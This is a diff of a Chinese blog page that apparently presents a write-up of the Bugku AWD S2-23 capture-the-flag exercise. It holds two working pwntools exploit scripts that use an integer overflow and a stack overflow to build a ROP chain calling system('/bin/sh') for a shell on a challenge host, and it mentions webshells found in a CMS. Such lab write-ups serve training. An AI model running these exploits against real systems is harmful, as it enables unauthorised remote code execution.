@@ -16,12 +16,12 @@
   <meta name="author" content="TMagWarO">
   <meta name="keywords" content="">
   
-    <meta name="description" content="PWN本次pwn题是bugku上的pwn题Easy_int，这里做个简单分析。 查看保护，只有NX保护   ida F5分析   这里有个简单整数溢出,输入2147483648，执行vuln函数，   buf这里有个很明显的栈溢出，存在system函数，但是参数不是&#x2F;bin&#x2F;sh。Shirt + F12查找字符串，存在字符&#x2F;bin&#x2F;sh   所以思路很明确，">
+    <meta name="description" content="PWN本次pwn题是bugku上的pwn题Easy_int，这里做个简单分析。 查看保护，只有NX保护  ida F5分析  这里有个简单整数溢出,输入2147483648，执行vuln函数，  buf这里有个很明显的栈溢出，存在system函数，但是参数不是&#x2F;bin&#x2F;sh。Shirt + F12查找字符串，存在字符&#x2F;bin&#x2F;sh  所以思路很明确，利用这里的栈溢出修改system的参数，拿she">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Bugku AWD S2-23">
 <meta property="og:url" content="http://tmagwaro.github.io/2024/03/27/S2-23/index.html">
 <meta property="og:site_name" content="TMagWarO">
-<meta property="og:description" content="PWN本次pwn题是bugku上的pwn题Easy_int，这里做个简单分析。 查看保护，只有NX保护   ida F5分析   这里有个简单整数溢出,输入2147483648，执行vuln函数，   buf这里有个很明显的栈溢出，存在system函数，但是参数不是&#x2F;bin&#x2F;sh。Shirt + F12查找字符串，存在字符&#x2F;bin&#x2F;sh   所以思路很明确，">
+<meta property="og:description" content="PWN本次pwn题是bugku上的pwn题Easy_int，这里做个简单分析。 查看保护，只有NX保护  ida F5分析  这里有个简单整数溢出,输入2147483648，执行vuln函数，  buf这里有个很明显的栈溢出，存在system函数，但是参数不是&#x2F;bin&#x2F;sh。Shirt + F12查找字符串，存在字符&#x2F;bin&#x2F;sh  所以思路很明确，利用这里的栈溢出修改system的参数，拿she">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://tmagwaro.github.io/2024/03/27/S2-23/image-20240327170536541.png">
 <meta property="og:image" content="http://tmagwaro.github.io/2024/03/27/S2-23/image-20240327170625374.png">
@@ -258,7 +258,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          298 字
+          294 字
         
       </span>
     
@@ -314,29 +314,19 @@
                 <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>本次pwn题是bugku上的pwn题Easy_int，这里做个简单分析。</p>
 <p>查看保护，只有NX保护</p>
 <img src="/2024/03/27/S2-23/image-20240327170536541.png" srcset="/img/loading.gif" lazyload class title="image-20240327170536541">
-
 <p>ida F5分析</p>
 <img src="/2024/03/27/S2-23/image-20240327170625374.png" srcset="/img/loading.gif" lazyload class title="image-20240327170625374">
-
 <p>这里有个简单整数溢出,输入2147483648，执行vuln函数，</p>
 <img src="/2024/03/27/S2-23/image-20240327171034907.png" srcset="/img/loading.gif" lazyload class title="image-20240327171034907">
-
-<p>buf这里有个很明显的栈溢出，存在system函数，但是参数不是&#x2F;bin&#x2F;sh。Shirt + F12查找字符串，存在字符&#x2F;bin&#x2F;sh</p>
+<p>buf这里有个很明显的栈溢出，存在system函数，但是参数不是/bin/sh。Shirt + F12查找字符串，存在字符/bin/sh</p>
 <img src="/2024/03/27/S2-23/image-20240327171302262.png" srcset="/img/loading.gif" lazyload class title="image-20240327171302262">
-
 <p>所以思路很明确，利用这里的栈溢出修改system的参数，拿shell，</p>
 <img src="/2024/03/27/S2-23/image-20240327171557436.png" srcset="/img/loading.gif" lazyload class title="image-20240327171557436">
-
 <p>64位程序，我们需要先控制rdi寄存器，因此构造rop链：b’a’*(0x20+8)+p64(pop_rdi_ret)+p64(binsh)+p64(system),这里需要考虑下堆栈平衡，加个ret或者直接call _system,给出两个版本代码。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&#x27;114.67.175.224&#x27;,17977)</span><br><br>pop_rdi_ret=<span class="hljs-number">0x401343</span><br>ret=<span class="hljs-number">0x40101a</span><br>binsh=<span class="hljs-number">0x403500</span><br>call_system=<span class="hljs-number">0x4011F0</span><br>p.sendline(<span class="hljs-string">b&#x27;2147483648&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Congratulations!&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi_ret)+p64(binsh)+p64(call_system))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
-
-
-
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;114.67.175.224&#x27;</span>,<span class="hljs-number">17977</span>)<br>elf = ELF (<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>system=elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br><br><span class="hljs-comment">#ROPgadget --binary ./pwn --only &#x27;pop|ret&#x27;</span><br>pop_rdi_ret=<span class="hljs-number">0x401343</span><br>ret=<span class="hljs-number">0x40101a</span><br>binsh=<span class="hljs-number">0x403500</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>) <br>payload += p64(ret) <br>payload += p64(pop_rdi_ret)<br>payload += p64(binsh) <br>payload += p64(system)<br>p.sendline(<span class="hljs-string">b&#x27;2147483648&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Congratulations!&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
-
 <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>D盾扫描，存在两个过狗一句话</p>
 <img src="/2024/03/27/S2-23/image-20240327172728529.png" srcset="/img/loading.gif" lazyload class title="image-20240327172728529">
-
 <p>网站cms是PbootCMS V3.0.1，</p>
 
                 
@@ -743,5 +733,20 @@
   <noscript>
     <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
   </noscript>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 </body>
 </html>
